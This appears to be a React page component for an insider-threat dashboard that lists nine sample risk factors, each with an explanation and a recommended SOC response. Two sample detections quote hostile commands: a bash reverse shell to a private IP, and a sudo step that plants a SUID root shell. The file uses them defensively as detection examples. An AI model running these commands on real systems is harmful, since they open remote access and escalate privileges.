import React, { useState } from 'react';
import { 
  BrainCircuit, 
  Search, 
  HelpCircle, 
  ShieldAlert, 
  AlertTriangle, 
  CheckCircle2, 
  ArrowRight,
  Filter
} from 'lucide-react';
import { useTheme } from '../context/ThemeContext';

export const ExplainableAiPage = ({ users = [], events = [], incidents = [], onSelectUser }) => {
  const { isDark } = useTheme();
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedSeverity, setSelectedSeverity] = useState('ALL');

  // The exact 9 factors requested in the prompt:
  // Unknown Device, Night Login, Failed Login Attempts, Downloads, Large Upload, USB Activity, Suspicious Destination, Shell Execution, Privilege Escalation
  // Each with: Detected, Impact, Explanation, Recommendation
  const xaiFactors = [
    {
      id: 'xai-1',
      name: 'Unknown Device',
      factorKey: 'DEVICE_UNRECOGNIZED',
      detected: 'Hardware MAC & browser fingerprint not in user baseline (DEV-UNRECOG-92)',
      impact: '+25 Risk Points',
      severity: 'HIGH',
      explanation: 'Authentication originated from an unmanaged, previously unseen device signature with zero cryptographic certificate trust history.',
      recommendation: 'Mandate hardware endpoint enrollment, trigger cryptographic Step-Up MFA challenge, and isolate lateral subnet routing.'
    },
    {
      id: 'xai-2',
      name: 'Night Login',
      factorKey: 'TEMPORAL_OFFHOURS',
      detected: '03:42 AM Local (Standard approved baseline hours: 09:00 - 18:00)',
      impact: '+18 Risk Points',
      severity: 'MEDIUM',
      explanation: 'Authentication occurred outside documented working hours, deviating > 5.5 hours from Gaussian temporal cluster centers.',
      recommendation: 'Require biometric secondary factor confirmation and record session telemetry in continuous audit stream.'
    },
    {
      id: 'xai-3',
      name: 'Failed Login Attempts',
      factorKey: 'AUTH_BURST_FAILURES',
      detected: '4 consecutive invalid password attempts within a 90-second window',
      impact: '+28 Risk Points',
      severity: 'HIGH',
      explanation: 'Rapid authentication failure rate exceeds statistical thresholds, matching credential stuffing or automated brute force signatures.',
      recommendation: 'Temporarily lock authentication gateway for 15 minutes, require administrator approval, and dispatch SMS notification.'
    },
    {
      id: 'xai-4',
      name: 'Downloads',
      factorKey: 'EGRESS_VOLUME_ANOMALY',
      detected: '4,280 MB downloaded in single session (User baseline max: 500 MB/day)',
      impact: '+32 Risk Points',
      severity: 'CRITICAL',
      explanation: 'Unusually high data egress volume detected exceeding 8.5x the user established 30-day moving average baseline.',
      recommendation: 'Restrict DLP egress channel immediately, flag incident for SOC lead review, and terminate active data pipes.'
    },
    {
      id: 'xai-5',
      name: 'Large Upload',
      factorKey: 'BULK_UPLOAD_EXTERNAL',
      detected: '1,850 MB transferred to external cloud bucket (s3.external-sync-repo.net)',
      impact: '+35 Risk Points',
      severity: 'CRITICAL',
      explanation: 'Bulk encrypted payload transmission directed to non-whitelisted external IP endpoint without DLP cryptographic token.',
      recommendation: 'Sever external socket connection and freeze employee file transfer privileges pending compliance review.'
    },
    {
      id: 'xai-6',
      name: 'USB Activity',
      factorKey: 'PERIPHERAL_STORAGE_MOUNT',
      detected: 'Removable Mass Storage Device mounted: SanDisk Ultra 64GB (ID: USB-9831)',
      impact: '+22 Risk Points',
      severity: 'HIGH',
      explanation: 'Peripheral storage connection registered on a classified financial workstation without prerequisite peripheral certificate authorization.',
      recommendation: 'Block USB mass storage interface via endpoint management agent and request formal justification.'
    },
    {
      id: 'xai-7',
      name: 'Suspicious Destination',
      factorKey: 'GEOLOCATION_IMPOSSIBLE_TRAVEL',
      detected: 'IP: 198.51.100.23 (Country: RO / Bucharest; User baseline: US-East)',
      impact: '+30 Risk Points',
      severity: 'HIGH',
      explanation: 'Impossible travel velocity detected: IP geographical distance of 4,800 miles cannot be traversed within the 20-minute inter-session window.',
      recommendation: 'Invalidate all active OAuth refresh tokens immediately and enforce global credential revocation.'
    },
    {
      id: 'xai-8',
      name: 'Shell Execution',
      factorKey: 'SUSPICIOUS_SHELL_PROCESS',
      detected: 'Executed interactive subshell: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"',
      impact: '+40 Risk Points',
      severity: 'CRITICAL',
      explanation: 'Interactive reverse TCP shell invocation detected spawning under non-administrative web application worker process.',
      recommendation: 'Zero Trust automated containment: Immediately kill parent process, isolate container host, and alert SOC lead.'
    },
    {
      id: 'xai-9',
      name: 'Privilege Escalation',
      factorKey: 'SUDO_PRIVILEGE_ELEVATION',
      detected: 'Executed: "sudo -u root /bin/cp /bin/sh /tmp/rootshell && chmod +s /tmp/rootshell"',
      impact: '+45 Risk Points',
      severity: 'CRITICAL',
      explanation: 'Unauthorized SUID root binary installation attempt violating principle of least privilege and container security policy.',
      recommendation: 'Autonomous Zero Trust Policy enforcement: IMMEDIATELY FREEZE user account and quarantine endpoint hardware.'
    }
  ];

  const filteredFactors = xaiFactors.filter(f => {
    const q = searchQuery.toLowerCase();
    const matchesQuery = 
      f.name.toLowerCase().includes(q) ||
      f.detected.toLowerCase().includes(q) ||
      f.explanation.toLowerCase().includes(q) ||
      f.recommendation.toLowerCase().includes(q);

    const matchesSeverity = selectedSeverity === 'ALL' || f.severity === selectedSeverity;

    return matchesQuery && matchesSeverity;
  });

  return (
    <div className="space-y-10">
      {/* Editorial Header */}
      <div className={`p-8 sm:p-10 border border-[#D4AF37]/25 relative transition-colors ${
        isDark ? 'bg-black' : 'bg-white'
      }`}>
        <div className="flex flex-col lg:flex-row lg:items-end justify-between gap-6 relative z-10">
          <div>
            <div className="flex items-center gap-3 mb-3">
              <span className="text-[10px] font-mono tracking-[0.25em] uppercase text-[#D4AF37] border border-[#D4AF37]/40 px-2.5 py-0.5">
                EXPLAINABLE AI (XAI)
              </span>
              <span className="text-[11px] font-mono text-gray-500">
                SHAP / TREE ATTRIBUTION ENGINE
              </span>
            </div>

            {/* Required Editorial Title */}
            <h1 className="font-serif-display text-3xl sm:text-4xl lg:text-5xl font-light tracking-tight">
              Why was this activity considered risky?
            </h1>
            <p className="text-xs text-gray-400 max-w-2xl mt-3 font-sans leading-relaxed">
              Every anomalous risk score generated by the CyberOrbit dual-layer machine learning models is mathematically decomposed into individual, human-interpretable risk factors.
            </p>
          </div>

          <div className="text-right font-mono text-xs">
            <span className="text-gray-500">EVALUATED FACTORS: </span>
            <span className="text-[#D4AF37] font-bold">9 VECTORS</span>
          </div>
        </div>
      </div>

      {/* Filter and Search Bar */}
      <div className={`p-4 border border-[#D4AF37]/20 flex flex-col sm:flex-row gap-4 items-center justify-between ${
        isDark ? 'bg-[#0A0C10]' : 'bg-white'
      }`}>
        <div className="relative w-full sm:w-80">
          <input
            type="text"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder="Search risk factors, detected events, recommendations..."
            className={`w-full border text-xs pl-9 pr-3 py-2 outline-none font-mono transition-all ${
              isDark 
                ? 'bg-black border-[#D4AF37]/30 text-white focus:border-[#D4AF37]' 
                : 'bg-[#F9F9F7] border-gray-300 text-black focus:border-[#D4AF37]'
            }`}
          />
          <Search className="w-3.5 h-3.5 text-[#D4AF37] absolute left-3 top-1/2 -translate-y-1/2" />
        </div>

        <div className="flex items-center gap-3 w-full sm:w-auto text-xs font-mono">
          <span className="text-gray-400">SEVERITY:</span>
          <select
            value={selectedSeverity}
            onChange={(e) => setSelectedSeverity(e.target.value)}
            className={`border text-xs px-3 py-1.5 outline-none font-mono cursor-pointer ${
              isDark ? 'bg-black border-[#D4AF37]/30 text-white' : 'bg-white border-gray-300 text-black'
            }`}
          >
            <option value="ALL">All Severities</option>
            <option value="CRITICAL">Critical</option>
            <option value="HIGH">High</option>
            <option value="MEDIUM">Medium</option>
          </select>
        </div>
      </div>

      {/* 9 Required Factors Editorial Cards */}
      {/* Unknown Device, Night Login, Failed Login Attempts, Downloads, Large Upload, USB Activity, Suspicious Destination, Shell Execution, Privilege Escalation */}
      <div className="space-y-6">
        {filteredFactors.map((factor, index) => {
          const isCritical = factor.severity === 'CRITICAL';
          const isHigh = factor.severity === 'HIGH';

          return (
            <div
              key={factor.id}
              className={`p-6 sm:p-8 border transition-all duration-200 ${
                isDark ? 'bg-black' : 'bg-white'
              } ${
                isCritical 
                  ? 'border-red-500/40 hover:border-red-500' 
                  : isHigh 
                    ? 'border-[#D4AF37]/40 hover:border-[#D4AF37]' 
                    : 'border-[#D4AF37]/25 hover:border-[#D4AF37]'
              }`}
            >
              {/* Factor Header */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-[#D4AF37]/15">
                <div className="flex items-center gap-3">
                  <span className="w-6 h-6 border border-[#D4AF37]/50 flex items-center justify-center font-mono text-[11px] text-[#D4AF37]">
                    0{index + 1}
                  </span>
                  <div>
                    <h3 className="font-serif-display text-2xl font-light tracking-tight">
                      {factor.name}
                    </h3>
                    <span className="text-[10px] font-mono text-gray-500">
                      IDENTIFIER: {factor.factorKey}
                    </span>
                  </div>
                </div>

                <div className="flex items-center gap-3">
                  <span className="text-xs font-mono text-[#D4AF37] font-semibold">
                    {factor.impact}
                  </span>
                  <span className={`text-[10px] font-mono px-2 py-0.5 border uppercase font-bold ${
                    isCritical 
                      ? 'border-red-500 text-red-400 bg-red-500/10' 
                      : isHigh 
                        ? 'border-[#D4AF37] text-[#D4AF37] bg-[#D4AF37]/10' 
                        : 'border-gray-500 text-gray-400'
                  }`}>
                    {factor.severity}
                  </span>
                </div>
              </div>

              {/* 4 Required Factor Fields: Detected, Impact, Explanation, Recommendation */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 pt-6">
                {/* Detected */}
                <div className="space-y-1.5">
                  <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-[#D4AF37] block">
                    TELEMETRY DETECTED
                  </span>
                  <p className="font-mono text-xs text-gray-300 leading-relaxed bg-gray-500/5 p-3 border border-[#D4AF37]/15">
                    {factor.detected}
                  </p>
                </div>

                {/* Impact */}
                <div className="space-y-1.5">
                  <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-[#D4AF37] block">
                    DECISION IMPACT
                  </span>
                  <p className="font-mono text-xs text-gray-300 leading-relaxed bg-gray-500/5 p-3 border border-[#D4AF37]/15">
                    Shift in composite risk score: <strong className="text-[#D4AF37]">{factor.impact}</strong>. Bayesian trust penalty applied across temporal epoch.
                  </p>
                </div>

                {/* Explanation */}
                <div className="space-y-1.5">
                  <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-gray-400 block">
                    MODEL EXPLANATION
                  </span>
                  <p className="font-sans text-xs text-gray-400 leading-relaxed">
                    {factor.explanation}
                  </p>
                </div>

                {/* Recommendation */}
                <div className="space-y-1.5">
                  <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-[#D4AF37] block">
                    RECOMMENDED SOC POLICY
                  </span>
                  <p className="font-sans text-xs text-gray-300 leading-relaxed">
                    {factor.recommendation}
                  </p>
                </div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
};
